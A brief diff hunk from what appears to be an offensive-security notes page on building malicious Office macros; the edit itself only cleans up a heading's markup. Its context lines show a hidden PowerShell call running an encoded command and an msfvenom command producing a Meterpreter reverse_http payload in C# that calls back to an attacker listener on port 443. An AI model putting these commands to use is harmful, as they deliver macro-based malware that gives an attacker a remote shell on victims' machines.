@@ -80,7 +80,7 @@ powershell.exe -nop -w hidden -e $encodedCommand
 
 ## <mark style="color:red;">Custom Macro Development</mark>
 
-### &#x20;<mark style="color:orange;">****</mark> <mark style="color:orange;"></mark><mark style="color:orange;">Msfvenom +  Unicorn</mark>
+### &#x20;<mark style="color:orange;">Msfvenom +  Unicorn</mark>
 
 ```
 msfvenom -p /windows/x64/meterpreter/reverse_http LHOST=eth0 LPORT=443 -f csharp -o payload.cs
